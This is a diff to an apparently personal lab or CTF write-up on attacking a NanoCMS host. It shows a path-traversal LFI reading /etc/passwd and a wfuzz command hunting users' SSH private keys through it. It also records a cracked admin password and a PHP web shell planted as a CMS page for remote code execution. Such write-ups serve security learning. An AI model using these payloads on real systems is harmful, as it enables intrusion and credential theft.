@@ -106,7 +106,7 @@ My attemts with `smbclient --no-pass //192.168.88.220/` or `smbclient -N -L //19
 
 ## Vulnerabilities analysis
 
-1. Didn't find usefull cve...
+1. Didn't find usefull cve...But I searched again and found! NanoCMS has a [vulnerability](https://www.securityfocus.com/bid/34508/exploit "https://www.securityfocus.com/bid/34508/exploit").
 
 2. Found LFI at `/index.php?page=../../../../../../etc/passwd%00`.
 
@@ -128,4 +128,20 @@ Brute-force `.ssh` and `id_rsa` key, but nothing:
 wfuzz -c -w ../enum/creds/users.txt --hs "Warning" http://192.168.88.220/index.php?page=../../../../../../home/FUZZ/.ssh/id_rsa%00 > ssh_keys.txt 
 ```
 
+I tried all cases and files...OKAY, I can't exploit it. Too heavy. You can find exploit on this case with usage of `phpinfo.php`, but I'll try it later...
 
+### Use /~andy/data/pagesdata.txt
+
+Found hash of the password. Crach with [this](https://crackstation.net/ "https://crackstation.net/").
+admin: shannon
+
+Next step - try to get RCE.
+
+#### RCE
+
+Go to `New page` and create a file with content:
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Then, you'll try to get a reverse shell, but nothing.
